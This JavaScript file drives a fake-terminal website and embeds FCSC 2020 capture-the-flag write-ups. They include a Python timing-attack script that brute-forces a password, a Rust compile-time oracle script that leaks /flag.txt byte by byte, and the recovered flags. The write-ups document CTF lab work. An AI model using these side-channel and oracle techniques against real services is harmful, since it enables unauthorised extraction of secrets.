"use strict";

/**
 * Configs
 */
var configs = (function () {
    var instance;
    var Singleton = function (options) {
        var options = options || Singleton.defaultOptions;
        for (var key in Singleton.defaultOptions) {
            this[key] = options[key] || Singleton.defaultOptions[key];
        }
    };
    Singleton.defaultOptions = {
        general_help: "Below there's a list of commands that you can use.\nYou can use autofill by pressing the TAB key, autocompleting if there's only 1 possibility, or showing you a list of possibilities.",
        ls_help: "List information about the files and folders (the current directory by default).",
        cat_help: "Read FILE(s) content and print it to the standard output (screen).",
        whoami_help: "Print the user name associated with the current effective user ID and more info.",
        date_help: "Print the system date and time.",
        help_help: "Print this menu.",
        clear_help: "Clear the terminal screen.",
        reboot_help: "Reboot the system.",
        graphic_help: "Displays the site in a more graphic way.",
        cd_help: "Change the current working directory.",
        mv_help: "Move (rename) files.",
        rm_help: "Remove files or directories.",
        rmdir_help: "Remove directory, this command will only work if the folders are empty.",
        touch_help: "Change file timestamps. If the file doesn't exist, it's created an empty one.",
        sudo_help: "Execute a command as the superuser.",
        welcome: "FCSC - 2020 - Misc\n",
        internet_explorer_warning: "NOTE: I see you're using internet explorer, this sound bad for this website and your security.",
        welcome_file_name: "welcome_message.txt",
        invalid_command_message: "<value>: command not found.",
        reboot_message: "Preparing to reboot...\n\n3...\n\n2...\n\n1...\n\nRebooting...\n\n",
        permission_denied_message: "Unable to '<value>', permission denied.",
        sudo_message: "Unable to sudo using a web client.",
        usage: "Usage",
        file: "file",
        folder: "folder",
        folder_not_found: "'<value>': not such directory.",
        file_not_found: "File '<value>' not found.",
        username: "Username",
        hostname: "Host",
        platform: "Platform",
        accesible_cores: "Accessible cores",
        language: "Language",
        value_token: "<value>",
        host: "wortyClient",
        user: "guest",
        is_root: false,
        type_delay: 5
    };
    return {
        getInstance: function (options) {
            instance === void 0 && (instance = new Singleton(options));
            return instance;
        }
    };
})();

/**
 * Your files here
 */
var files = (function () {
    var instance;
    var Singleton = function (options) {
        var options = options || Singleton.defaultOptions;
        for (var key in Singleton.defaultOptions) {
            this[key] = options[key] || Singleton.defaultOptions[key];
        }
    };
    Singleton.defaultOptions = {
        "Randomito": `
        ----------------------------------------------------
        Prompt:
        Pourrez-vous deviner le secret aléatoire généré ?
        ----------------------------------------------------
        
        First, we download the file given with the challenge, to examine the python code. 

        We directly see that this code is wrote with python2, so, when connecting to the challenge, we ask me for a and b:
        a = secret_a
        b = secret_b
        
        Yes, I enter, for the variable, the "secret" variables, this is a common vulnerability in python2.
        FCSC{4496d11d19db92ae53e0b9e9415d99d877ebeaeab99e9e875ac346c73e8aca77} 
        `,
        "Clepsydre":`
        --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        Prompt:
        À l'origine, la clepsydre est un instrument à eau qui permet de définir la durée d'un évènement, la durée d'un discours par exemple. 
        On contraint la durée de l’évènement au temps de vidage d'une cuve contenant de l'eau qui s'écoule par un petit orifice. 
        Dans l'exemple du discours, l'orateur doit s'arrêter quand le récipient est vide. La durée visualisée par ce moyen est indépendante d'un débit régulier du liquide ; le récipient peut avoir n'importe quelle forme. 
        L'instrument n'est donc pas une horloge hydraulique (Wikipedia). 
        --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

        We just have to connect with the netcat, we didn't have any files, nothing.
        But, with the given description, I directly identify a timing attack.
        This attack is based on the fact that the server will spend more time to respond if we give a correct character.
        
        For example, in this challenge, if we send a "n", the server respond us in 0.2 seconds, but, if we send a "T" the server respond in 1 second.
        So, i just wrote a basic python script to automize this :
        
         
        import socket
        import time

        def init(host, port):
        &nbsp;&nbsp;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        &nbsp;&nbsp;s.connect((host, port))
        &nbsp;&nbsp;print("\\n[!] Connection on {}\\n".format(port))
        &nbsp;&nbsp;return s
        
        if __name__=="__main__":
        &nbsp;&nbsp;char = {}
        &nbsp;&nbsp;for i in range(33, 122):
        &nbsp;&nbsp;&nbsp;&nbsp;s = init("challenges2.france-cybersecurity-challenge.fr", 6006)
        &nbsp;&nbsp;&nbsp;&nbsp;t = time.time()
        &nbsp;&nbsp;&nbsp;&nbsp;while True:
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;inp = s.recv(1024).decode()
        
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if inp == "" or "incorrect" in inp:
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;elapsed = time.time() - t
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print("[!] Execution time : {}".format(elapsed))
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char[chr(i)] = elapsed
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break
        
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(" >>> {}".format(inp))
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print("[*] Testing {}".format(chr(i)))
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s.send("T3mp#!{}\\n".format(chr(i)).encode())
        
        &nbsp;&nbsp;&nbsp;&nbsp;match = sorted(char.items(), key=lambda x: x[1])
        &nbsp;&nbsp;&nbsp;&nbsp;print("\\n[!] match :\\n{}".format(match))


        We recover the correct password : T3mp#!
        Let's connect to the server to get our flag :
        FCSC{6bdd5f185a5fda5ae37245d355f757eb0bbe888eea004cda16cf79b2c0d60d32}    
        `,
        "Rustique":`
        ------------------------------------------------------------------------------
        Prompt:
        On vous demande d'auditer cette solution de vérification syntaxique en Rust.
        ------------------------------------------------------------------------------

        To start this challenge, I will directly read the FAQ related to the challenge. Here, I can learn several things: Past code is never executed, and in any case, the server will only return "0" or "1" in relation to the compilation.
        So I remember the compiler version used: "version 1.41.0". I'm looking for possible flaws on the version of this compiler. I fall an article about a CVE (Remote code execution in bitvec and Rust), but it happens at code execution, so it's not that.
        So I read about rust, and I find a compiler online : rust playground. I'm going to use it for this challenge, to test my different payloads, and to be able to simply identify my errors. After several researches, I see, that when compiling, you can include string/bytes from :
        include_bytes !('/PATH/TO/FILE');
        
        Having read the FAQ, I know that a /flag.txt file is placed at the root of the server. So I decide to try to load this:
        
        
        let flag = include_bytes!("/flag.txt");
        The server return me 0, so, it compile !


        
        Success! We manage to load the bytes that make up the flag, but now we can't display it because the code isn't executed, so we'll have to find a way to do that.
        My first hypothesis is to make macro_rules! with rust, but, despite many tests, I can't make comparisons on the bytes that make up the flag. So I decide to give up this idea.
        While I was enquiring about the rust compiler, I found a sub reddit that talks about array handling during compilation: When you declare an array in rust, it knows its size at compile time. So I keep this in a note for the future.

        At the same time, I'm asking about the type that include_bytes returns. I learn that include_bytes returns an object that is close to an array, in other words, all bytes are contained in an array box, here, the array would be name "flag".
        From then on, I'm going to do some tests with rust-playground, to check what I found on the internet. This work, so, i can use this for my future payload.

        We can see that the variable "flag" is managed as an array. Great! This is going to be very handy ...for the rest of it.
        After "playing" with rust playground and apprehending a little more the language, an idea comes to me:
        I could create another array that has the value of flag[i] as its size, and find its size for determine character.
        So I'm asking about how to declare a painting in rust. With my research, I find that I can assign a size to an array before assigning a value to it, in other words, I could do this to determine the size of the flag.
        So I compare it to other challenges, and I finds that the flags are 71 in size. So I test this in the compiler, and it work ! It compiles !
        Note that if I change 71 by 70, rust denies me the compilation because it can't store the whole flag.txt file in the flag array. So we are now sure that the size of the flag is 71, which seems logical.


        Now, I will try to exploit my hypothesis, that of creating an array of the size of flag[i], to do so, I will use once again rust playground, to identify my errors :


        fn main(){
            let flag = b"\\x01\\x02\\x03";
            let monTableau = &[u8;flag[0]] = [0;flag[0]];
        }


        The rust-playground compiler told me that my value flag[0] isn't a constant value, hm, strange.
        According to the compiler, flag[0] is not a constant value, so I search the internet, and a simple way to set this is to declare the flag array as a constant with the keyword const.
        One last problem: flag[0] is a bytes, for example \\x01, so I'll have to find a way to cast it in "usize", to be able to instantiate the array with it.
        To do so, we will use the keyword: "as usize". So our payload becomes :


        fn main(){
            const flag: &[u8;3] = b"\\x01\\x02\\x03";
            let monTableau = &[u8;flag[0] as usize] = [0;flag[0] as usize];
            println!("{}",monTableau.len());
        }


        I have println to check the size of my painting, and it is indeed size 1! We'll be able to rebuild our flag like that!
        Go last problem but which is easily solved, how to have the size of the array, given that the code is never executed?
        Remember, at the beginning, with my research, I saw that at the compilation, rust knew the size of the table. You just have to assign as value to a variable the cells, which takes the 48,49,50,... (because the characters are stored from 48 to 126).
        The code will compile until I try to assign as the value of the variable: len(array)+1. So, I would know that the character I should take is the current value of the loop.

        (Sidebar)
        In my definition of the table I only assign zeros to it, which allows me to access the
        different boxes on the board.
        (End of sidebar)

        To check this, I try with the first character, which is normally an "F":


        --------------------------COMPILE---------------------------------
        const flag: &[u8;71] = include_bytes!("/flag.txt");
        let monTableau = &[u8;flag[0] as usize] = [0;flag[0] as usize];
        let test = monTableau[69];
        --------------------------COMPILE---------------------------------


        ---------------------------NOT COMPILE----------------------------
        const flag: &[u8;71] = include_bytes!("/flag.txt");
        let monTableau = &[u8;flag[0] as usize] = [0;flag[0] as usize];
        let test = monTableau[70];
        ---------------------------NOT COMPILE----------------------------


        So the first character is 69, let's output python: chr(69) = F.
        Perfect! Now we just have to build a script that will do this for us: 


        import requests as r
        #0 : Rust compile
        #1 : Rust ne compile pas
        host = "http://challenges2.france-cybersecurity-challenge.fr:6005/check" #url
        flag = '' #ce qui va contenir noter flag
        for i in range(0,70): #On sait que le flag fait 71 carac (soit des indices de 0 à 70)
        &nbsp;&nbsp;payload = ''
        &nbsp;&nbsp;payload += 'const flag : &[u8;71] = include_bytes!(\"/flag.txt\");\\n' 
        &nbsp;&nbsp;#On récupère les bytes qui composent le flag dans le fihcier flag.txt
        &nbsp;&nbsp;payload += " let monTableau: [u8; flag["+str(i)+"] as usize] = [0; flag["+str(i)+"] as usize];\\n" 
        &nbsp;&nbsp;#On initialise un tableau de la taille de flag[i], A -> 0x41
        &nbsp;&nbsp;for j in range(48,125):
        &nbsp;&nbsp;&nbsp;&nbsp;payload += ' let test = monTableau['+str(j)+'];' 
        &nbsp;&nbsp;&nbsp;&nbsp;#On détermine la taille du tableau pour en connaitre la lettre associée (ex: 41 longeurs -> c'est un A)
        &nbsp;&nbsp;&nbsp;&nbsp;res = r.post(host,json={"content":payload})
        &nbsp;&nbsp;&nbsp;&nbsp;if("1" in res.text): #On regarde si le serveur nous répond qu'on tape en dehors du tableau, si oui, alors on prend ce caractère
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;chrBefore = j
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break
        &nbsp;&nbsp;flag += chr(chrBefore) #build du flag
        print(flag)


        After several minutes, I recover the entire flag:
        FCSC{a35036487430b24da38b43e1369f56e69a25bd39e594cd1e7ff3e97b62b3c638} 
        `
    };
    return {
        getInstance: function (options) {
            instance === void 0 && (instance = new Singleton(options));
            return instance;
        }
    };
})();

/**
 * Directories here
 */
var folders = (function () {
    var instance;
    var SingletonFolders = function (options){
        var options = options || SingletonFolders.defaultOptions;
        for(var key in SingletonFolders.defaultOptions){
            this[key] = options[key] || SingletonFolders.defaultOptions[key];
        }
    };
    SingletonFolders.defaultOptions = {
        "/": "../index.html",
        "..": "../fcsc2020.html"
    };
    return{
        getInstance: function(options){
            instance == void 0 && (instance = new SingletonFolders(options));
            return instance;
        }
    };
})();
var main = (function () {

    /**
     * Aux functions
     */
    var isUsingIE = window.navigator.userAgent.indexOf("MSIE ") > 0 || !!navigator.userAgent.match(/Trident.*rv\:11\./);

    var ignoreEvent = function (event) {
        event.preventDefault();
        event.stopPropagation();
    };
    
    var scrollToBottom = function () {
        window.scrollTo(0, document.body.scrollHeight);
    };
    
    var isURL = function (str) {
        return (str.startsWith("http") || str.startsWith("www")) && str.indexOf(" ") === -1 && str.indexOf("\n") === -1;
    };
    
    /**
     * Model
     */
    var InvalidArgumentException = function (message) {
        this.message = message;
        // Use V8's native method if available, otherwise fallback
        if ("captureStackTrace" in Error) {
            Error.captureStackTrace(this, InvalidArgumentException);
        } else {
            this.stack = (new Error()).stack;
        }
    };
    // Extends Error
    InvalidArgumentException.prototype = Object.create(Error.prototype);
    InvalidArgumentException.prototype.name = "InvalidArgumentException";
    InvalidArgumentException.prototype.constructor = InvalidArgumentException;

    var cmds = {
        LS: { value: "ls", help: configs.getInstance().ls_help },
        CAT: { value: "cat", help: configs.getInstance().cat_help },
        WHOAMI: { value: "whoami", help: configs.getInstance().whoami_help },
        DATE: { value: "date", help: configs.getInstance().date_help },
        HELP: { value: "help", help: configs.getInstance().help_help },
        CLEAR: { value: "clear", help: configs.getInstance().clear_help },
        REBOOT: { value: "reboot", help: configs.getInstance().reboot_help },
        CD: { value: "cd", help: configs.getInstance().cd_help },
        MV: { value: "mv", help: configs.getInstance().mv_help },
        RM: { value: "rm", help: configs.getInstance().rm_help },
        RMDIR: { value: "rmdir", help: configs.getInstance().rmdir_help },
        TOUCH: { value: "touch", help: configs.getInstance().touch_help },
        SUDO: { value: "sudo", help: configs.getInstance().sudo_help },
        GRAPHIC : { value: "graphic", help: configs.getInstance().graphic_help}
    };

    var Terminal = function (prompt, cmdLine, output, sidenav, profilePic, user, host, root, outputTimer) {
        if (!(prompt instanceof Node) || prompt.nodeName.toUpperCase() !== "DIV") {
            throw new InvalidArgumentException("Invalid value " + prompt + " for argument 'prompt'.");
        }
        if (!(cmdLine instanceof Node) || cmdLine.nodeName.toUpperCase() !== "INPUT") {
            throw new InvalidArgumentException("Invalid value " + cmdLine + " for argument 'cmdLine'.");
        }
        if (!(output instanceof Node) || output.nodeName.toUpperCase() !== "DIV") {
            throw new InvalidArgumentException("Invalid value " + output + " for argument 'output'.");
        }
        if (!(sidenav instanceof Node) || sidenav.nodeName.toUpperCase() !== "DIV") {
            throw new InvalidArgumentException("Invalid value " + sidenav + " for argument 'sidenav'.");
        }
        if (!(profilePic instanceof Node) || profilePic.nodeName.toUpperCase() !== "IMG") {
            throw new InvalidArgumentException("Invalid value " + profilePic + " for argument 'profilePic'.");
        }
        (typeof user === "string" && typeof host === "string") && (this.completePrompt = user + "@" + host + ":~/writeups/fcsc2020/misc/" + (root ? "#" : "$"));
        this.profilePic = profilePic;
        this.prompt = prompt;
        this.cmdLine = cmdLine;
        this.output = output;
        this.sidenav = sidenav;
        this.sidenavOpen = false;
        this.sidenavElements = [];
        this.typeSimulator = new TypeSimulator(outputTimer, output);
    };

    Terminal.prototype.type = function (text, callback) {
        this.typeSimulator.type(text, callback);
    };

    Terminal.prototype.exec = function () {
        var command = this.cmdLine.value;
        this.cmdLine.value = "";
        this.prompt.textContent = "";
        this.output.innerHTML += "<span class=\"prompt-color\">" + this.completePrompt + "</span> " + command + "<br/>";
    };

    Terminal.prototype.init = function () {
        this.sidenav.addEventListener("click", ignoreEvent);
        this.cmdLine.disabled = true;
        this.sidenavElements.forEach(function (elem) {
            elem.disabled = true;
        });
        this.prepareSideNav();
        this.lock(); // Need to lock here since the sidenav elements were just added
        document.body.addEventListener("click", function (event) {
            if (this.sidenavOpen) {
                this.handleSidenav(event);
            }
            this.focus();
        }.bind(this));
        this.cmdLine.addEventListener("keydown", function (event) {
            if (event.which === 13 || event.keyCode === 13) {
                this.handleCmd();
                ignoreEvent(event);
            } else if (event.which === 9 || event.keyCode === 9) {
                this.handleFill();
                ignoreEvent(event);
            }
        }.bind(this));
        this.reset();
    };

    Terminal.makeElementDisappear = function (element) {
        element.style.opacity = 0;
        element.style.transform = "translateX(-300px)";
    };

    Terminal.makeElementAppear = function (element) {
        element.style.opacity = 1;
        element.style.transform = "translateX(0)";
    };

    Terminal.prototype.prepareSideNav = function () {
        var capFirst = (function () {
            return function (string) {
                return string.charAt(0).toUpperCase() + string.slice(1);
            }
        })();
        for (var file in files.getInstance()) {
            var element = document.createElement("button");
            Terminal.makeElementDisappear(element);
            element.onclick = function (file, event) {
                this.handleSidenav(event);
                this.cmdLine.value = "cat " + file + " ";
                this.handleCmd();
            }.bind(this, file);
            element.appendChild(document.createTextNode(capFirst(file.replace(/\.[^/.]+$/, "").replace(/_/g, " "))));
            this.sidenav.appendChild(element);
            this.sidenavElements.push(element);
        }
        // Shouldn't use document.getElementById but Terminal is already using loads of params
        document.getElementById("sidenavBtn").addEventListener("click", this.handleSidenav.bind(this));
    };

    Terminal.prototype.handleSidenav = function (event) {
        if (this.sidenavOpen) {
            this.profilePic.style.opacity = 0;
            this.sidenavElements.forEach(Terminal.makeElementDisappear);
            this.sidenav.style.width = "50px";
            document.getElementById("sidenavBtn").innerHTML = "&#9776;";
            this.sidenavOpen = false;
        } else {
            this.sidenav.style.width = "300px";
            this.sidenavElements.forEach(Terminal.makeElementAppear);
            document.getElementById("sidenavBtn").innerHTML = "&times;";
            this.profilePic.style.opacity = 1;
            this.sidenavOpen = true;
        }
        document.getElementById("sidenavBtn").blur();
        ignoreEvent(event);
    };

    Terminal.prototype.lock = function () {
        this.exec();
        this.cmdLine.blur();
        this.cmdLine.disabled = true;
        this.sidenavElements.forEach(function (elem) {
            elem.disabled = true;
        });
    };

    Terminal.prototype.unlock = function () {
        this.cmdLine.disabled = false;
        this.prompt.textContent = this.completePrompt;
        this.sidenavElements.forEach(function (elem) {
            elem.disabled = false;
        });
        scrollToBottom();
        this.focus();
    };

    Terminal.prototype.handleFill = function () {
        var cmdComponents = this.cmdLine.value.trim().split(" ");
        if ((cmdComponents.length <= 1) || (cmdComponents.length === 2 && cmdComponents[0] === cmds.CAT.value)) {
            this.lock();
            var possibilities = [];
            if (cmdComponents[0].toLowerCase() === cmds.CAT.value) {
                if (cmdComponents.length === 1) {
                    cmdComponents[1] = "";
                }
                for (var file in files.getInstance()) {
                    if (file.toLowerCase().startsWith(cmdComponents[1].toLowerCase())) {
                        possibilities.push(cmds.CAT.value + " " + file);
                    }
                }
            } else {
                for (var command in cmds) {
                    if (cmds[command].value.startsWith(cmdComponents[0].toLowerCase())) {
                        possibilities.push(cmds[command].value);
                    }
                }
            }
            if (possibilities.length === 1) {
                this.cmdLine.value = possibilities[0] + " ";
                this.unlock();
            } else if (possibilities.length > 1) {
                this.type(possibilities.join("\n"), function () {
                    this.cmdLine.value = cmdComponents.join(" ");
                    this.unlock();
                }.bind(this));
            } else {
                this.cmdLine.value = cmdComponents.join(" ");
                this.unlock();
            }
        }else if ((cmdComponents.length <= 1) || (cmdComponents.length === 2 && cmdComponents[0] === cmds.CD.value)) {
            this.lock();
            var possibilities = [];
            if (cmdComponents[0].toLowerCase() === cmds.CD.value) {
                if (cmdComponents.length === 1) {
                    cmdComponents[1] = "";
                }
                for (var folder in folders.getInstance()) {
                    if (folder.toLowerCase().startsWith(cmdComponents[1].toLowerCase())) {
                        possibilities.push(cmds.CD.value + " " + folder);
                    }
                }
            } else {
                for (var command in cmds) {
                    if (cmds[command].value.startsWith(cmdComponents[0].toLowerCase())) {
                        possibilities.push(cmds[command].value);
                    }
                }
            }
            if (possibilities.length === 1) {
                this.cmdLine.value = possibilities[0] + " ";
                this.unlock();
            } else if (possibilities.length > 1) {
                this.type(possibilities.join("\n"), function () {
                    this.cmdLine.value = cmdComponents.join(" ");
                    this.unlock();
                }.bind(this));
            } else {
                this.cmdLine.value = cmdComponents.join(" ");
                this.unlock();
            }
        }
    };

    Terminal.prototype.handleCmd = function () {
        var cmdComponents = this.cmdLine.value.trim().split(" ");
        this.lock();
        switch (cmdComponents[0]) {
            case cmds.CAT.value:
                this.cat(cmdComponents);
                break;
            case cmds.LS.value:
                this.ls();
                break;
            case cmds.WHOAMI.value:
                this.whoami();
                break;
            case cmds.DATE.value:
                this.date();
                break;
            case cmds.HELP.value:
                this.help();
                break;
            case cmds.CLEAR.value:
                this.clear();
                break;
            case cmds.REBOOT.value:
                this.reboot();
                break;
            case cmds.CD.value:
                this.cd(cmdComponents);
                break;
            case cmds.MV.value:
            case cmds.RMDIR.value:
            case cmds.RM.value:
            case cmds.TOUCH.value:
                this.permissionDenied(cmdComponents);
                break;
            case cmds.SUDO.value:
                this.sudo();
                break;
            case cmds.GRAPHIC.value:
                this.graphic();
                break;
            default:
                this.invalidCommand(cmdComponents);
                break;
        };
    };

    Terminal.prototype.cd = function (cmdComponents) {
        var result;
        if(cmdComponents.length <= 1 || cmdComponents.length > 2){
            result = configs.getInstance().usage + ": " + cmds.CD.value + " <"+ configs.getInstance().folder + ">";
            this.type(result, this.unlock.bind(this));
        }else if (!cmdComponents[1] || !folders.getInstance().hasOwnProperty(cmdComponents[1])){
            result = configs.getInstance().folder_not_found.replace(configs.getInstance().value_token, cmdComponents[1]);
            this.type(result, this.unlock.bind(this));
        }else{
            window.location.href = folders.getInstance()[cmdComponents[1]];
        }
    };

    Terminal.prototype.cat = function (cmdComponents) {
        var result;
        if (cmdComponents.length <= 1) {
            result = configs.getInstance().usage + ": " + cmds.CAT.value + " <" + configs.getInstance().file + ">";
        } else if (!cmdComponents[1] || (!cmdComponents[1] === configs.getInstance().welcome_file_name || !files.getInstance().hasOwnProperty(cmdComponents[1]))) {
            result = configs.getInstance().file_not_found.replace(configs.getInstance().value_token, cmdComponents[1]);
        } else {
            result = cmdComponents[1] === configs.getInstance().welcome_file_name ? configs.getInstance().welcome : files.getInstance()[cmdComponents[1]];
        }
        this.type(result, this.unlock.bind(this));
    };

    Terminal.prototype.ls = function () {
        var result ="";
        for(var folder in folders.getInstance()){
            result += "drwxr-xr-x "+folder+"\n";
        }
        for (var file in files.getInstance()) {
            result += "-rw-r--r-- "+file + "\n";
        }
        this.type(result.trim(), this.unlock.bind(this));
    };

    Terminal.prototype.sudo = function () {
        this.type(configs.getInstance().sudo_message, this.unlock.bind(this));
    }

    Terminal.prototype.whoami = function (cmdComponents) {
        var result = configs.getInstance().username + ": " + configs.getInstance().user + "\n" + configs.getInstance().hostname + ": " + configs.getInstance().host + "\n" + configs.getInstance().platform + ": " + navigator.platform + "\n" + configs.getInstance().accesible_cores + ": " + navigator.hardwareConcurrency + "\n" + configs.getInstance().language + ": " + navigator.language;
        this.type(result, this.unlock.bind(this));
    };

    Terminal.prototype.date = function (cmdComponents) {
        this.type(new Date().toString(), this.unlock.bind(this));
    };

    Terminal.prototype.help = function () {
        var result = configs.getInstance().general_help + "\n\n";
        for (var cmd in cmds) {
            result += cmds[cmd].value + " - " + cmds[cmd].help + "\n";
        }
        this.type(result.trim(), this.unlock.bind(this));
    };

    Terminal.prototype.clear = function () {
        this.output.textContent = "";
        this.prompt.textContent = "";
        this.prompt.textContent = this.completePrompt;
        this.unlock();
    };

    Terminal.prototype.reboot = function () {
        this.type(configs.getInstance().reboot_message, this.reset.bind(this));
    };

    Terminal.prototype.reset = function () {
        this.output.textContent = "";
        this.prompt.textContent = "";
        if (this.typeSimulator) {
            this.type(configs.getInstance().welcome + (isUsingIE ? "\n" + configs.getInstance().internet_explorer_warning : ""), function () {
                this.unlock();
            }.bind(this));
        }
    };

    Terminal.prototype.graphic = function(){
        document.location.href="/graphic.html";
    };

    Terminal.prototype.permissionDenied = function (cmdComponents) {
        this.type(configs.getInstance().permission_denied_message.replace(configs.getInstance().value_token, cmdComponents[0]), this.unlock.bind(this));
    };

    Terminal.prototype.invalidCommand = function (cmdComponents) {
        this.type(configs.getInstance().invalid_command_message.replace(configs.getInstance().value_token, cmdComponents[0]), this.unlock.bind(this));
    };

    Terminal.prototype.focus = function () {
        this.cmdLine.focus();
    };

    var TypeSimulator = function (timer, output) {
        var timer = parseInt(timer);
        if (timer === Number.NaN || timer < 0) {
            throw new InvalidArgumentException("Invalid value " + timer + " for argument 'timer'.");
        }
        if (!(output instanceof Node)) {
            throw new InvalidArgumentException("Invalid value " + output + " for argument 'output'.");
        }
        this.timer = timer;
        this.output = output;
    };

    TypeSimulator.prototype.type = function (text, callback) {
        if (isURL(text)) {
            window.open(text);
        }
        var i = 0;
        var output = this.output;
        var timer = this.timer;
        var skipped = false;
        var skip = function () {
            skipped = true;
        }.bind(this);
        document.addEventListener("dblclick", skip);
        (function typer() {
            if (i < text.length) {
                var char = text.charAt(i);
                var isNewLine = char === "\n";
                output.innerHTML += isNewLine ? "<br/>" : char;
                i++;
                if (!skipped) {
                    setTimeout(typer, isNewLine ? timer : timer);
                } else {
                    output.innerHTML += (text.substring(i).replace(new RegExp("\n", 'g'), "<br/>")) + "<br/>";
                    document.removeEventListener("dblclick", skip);
                    callback();
                }
            } else if (callback) {
                output.innerHTML += "<br/>";
                document.removeEventListener("dblclick", skip);
                callback();
            }
            scrollToBottom();
        })();
    };

    return {
        listener: function () {
            new Terminal(
                document.getElementById("prompt"),
                document.getElementById("cmdline"),
                document.getElementById("output"),
                document.getElementById("sidenav"),
                document.getElementById("profilePic"),
                configs.getInstance().user,
                configs.getInstance().host,
                configs.getInstance().is_root,
                configs.getInstance().type_delay
            ).init();
        }
    };
})();

window.onload = main.listener;
